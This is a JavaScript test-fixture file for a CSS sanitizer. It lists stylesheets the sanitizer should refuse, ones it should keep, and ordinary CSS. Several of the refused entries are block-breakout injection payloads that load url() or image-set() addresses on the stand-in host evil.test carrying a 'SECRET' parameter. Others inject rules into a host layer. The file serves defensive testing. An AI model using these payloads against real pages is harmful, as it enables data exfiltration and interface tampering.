/*
 * STYLESHEETS A JUDGE REFUSES, AND ONES IT KEEPS (Roadmap
 * f-view-authoring-friction-2026-11). What it keeps reads the same wherever it
 * is put. Shared by the sanitizer's test, the wrapper's test and the guest
 * harness.
 *
 * `fetches` is an address in the sheet: the harness holds that nothing asks
 * for it, in every engine.
 */
const out = (tag) => `https://evil.test/${tag}?d=SECRET`;

export const LEAVING = [
  { name: "@media closes the block, then url()", css: `@media }div{background-image:url("${out("media")}");z{}}`, fetches: out("media") },
  { name: "@media closes the block, then image-set()", css: `@media }div{background-image:image-set("${out("media-set")}" 1x);z{}}`, fetches: out("media-set") },
  { name: "@supports closes the block, then url()", css: `@supports }div{background-image:url("${out("supports")}");z{}}`, fetches: out("supports") },
  { name: "@supports closes the block, then image-set()", css: `@supports }div{background-image:image-set("${out("supports-set")}" 1x);z{}}`, fetches: out("supports-set") },
  { name: "@container closes the block, then url()", css: `@container }div{background-image:url("${out("container")}");z{}}`, fetches: out("container") },
  { name: "@container closes the block, then image-set()", css: `@container }div{background-image:image-set("${out("container-set")}" 1x);z{}}`, fetches: out("container-set") },
  { name: "after a rule that is fine", css: `@media all{}@media }div{background-image:url("${out("after")}");z{}}`, fetches: out("after") },
  { name: "a selector closes the block", css: "}div{color:rgb(9,9,9)}" },
  { name: "a selector carries a ;", css: "a;div{color:rgb(9,9,9)}" },
  { name: "@media makes a rule in the host's first layer", css: "@media }@layer graview-motion{button{outline:none!important}}" },
  { name: "@supports makes a rule in the host's first layer", css: "@supports }@layer graview-motion{button{outline:none!important}}" },
  { name: "@container makes a rule in the host's first layer", css: "@container }@layer graview-motion{button{outline:none!important}}" },
  { name: "an at-keyword in a condition", css: "@media @layer x{a{color:rgb(9,9,9)}}" },
  { name: "a ; in a condition's brackets", css: "@media (a;b){a{color:rgb(9,9,9)}}" },
  { name: "a } in a condition's brackets", css: "@media (}){a{color:rgb(9,9,9)}}" },
  { name: "a } in a selector's function", css: ":is(}){color:rgb(9,9,9)}" },
  { name: "<!-- in a condition", css: "@media <!-- all{a{color:rgb(9,9,9)}}" },
  { name: "--> in a selector", css: "a --> b{color:rgb(9,9,9)}" },
  { name: "a backslash before a newline in a selector", css: "a\\\n{color:rgb(9,9,9)}" },
  { name: "a backslash before a newline in a condition", css: "@media a\\\n{a{color:rgb(9,9,9)}}" },
  { name: "a stray ) in a selector", css: "a)b{color:rgb(9,9,9)}" },
  { name: "a stray ] in a condition", css: "@media a]{a{color:rgb(9,9,9)}}" },
  { name: "a stray ) in a value", css: "a{color:)}" },
];

/* The same tricks that stay inside, spelled so a judge must not be fooled and must not refuse: each is one balanced rule, written out with its } still inert. */
export const STAYING = [
  { name: "a } in an attribute's string", css: 'a[b="}"]{color:rgb(1,2,3)}' },
  { name: "a } in a comment", css: "@media /*}*/ all{a{color:rgb(1,2,3)}}" },
  { name: "an escaped } in a selector", css: "a\\}b{color:rgb(1,2,3)}" },
  { name: "a } by its code point in a selector", css: "a\\7d b{color:rgb(1,2,3)}" },
  { name: "a string left open at the end", css: 'a{content:"}' },
  { name: "a block left open at the end", css: "a{color:rgb(1,2,3)" },
  { name: "a } in a value's string", css: 'a::after{content:"}"}' },
];

/* What a sheet is written with every day: none of this is refused. */
export const ORDINARY = [
  "a:is(.b, .c) > d:not([e='f']) { color: red }",
  "@media (min-width: 40rem) and (prefers-color-scheme: dark) { a { color: red } }",
  "@media screen, print { a { color: red } }",
  "@supports (display: grid) and (not (display: inline-grid)) { a { color: red } }",
  "@supports selector(:has(a)) { a { color: red } }",
  "@container card (min-width: 20rem) { a { color: red } }",
  "@keyframes spin { from { rotate: 0deg } to { rotate: 360deg } }",
  "a { & b { color: red } @media (min-width: 1px) { color: blue } }",
];
